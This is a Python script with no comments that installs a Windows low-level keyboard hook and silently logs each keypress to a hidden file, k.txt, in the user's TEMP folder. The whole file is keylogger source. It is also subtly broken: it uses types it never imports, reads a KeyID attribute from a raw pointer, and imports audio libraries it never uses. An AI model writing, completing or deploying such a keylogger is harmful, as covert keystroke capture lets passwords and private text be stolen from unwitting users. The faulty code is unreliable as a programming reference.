import os
from ctypes import windll, CFUNCTYPE, c_uint, POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def on_key_event(event):
    if event.KeyID == 32:
        with open(os.getenv('TEMP') + '\k.txt', 'a') as f:
            f.write('[SPACE]')
    elif event.KeyID == 13:
        with open(os.getenv('TEMP') + '\k.txt', 'a') as f:
            f.write('[ENTER]\n')
    else:
        with open(os.getenv('TEMP') + '\k.txt', 'a') as f:
            f.write(f'[{event.KeyID}]')

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
user32 = windll.user32
hooks_manager = None
def hook_kb(llhookproc):
    global hooks_manager
    hooks_manager = user32.SetWindowsHookExW(WH_KEYBOARD_LL, llhookproc, 0, 0)
    msg = windll.user32.GetMessageW(None, 0, 0, 0)
    user32.UnhookWindowsHookEx(hooks_manager)
def low_level_handler(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        on_key_event(lParam)
    return user32.CallNextHookEx(hooks_manager, nCode, wParam, lParam)
hook_kb(CFUNCTYPE(c_int, c_int, c_uint, POINTER(c_void_p))(low_level_handler))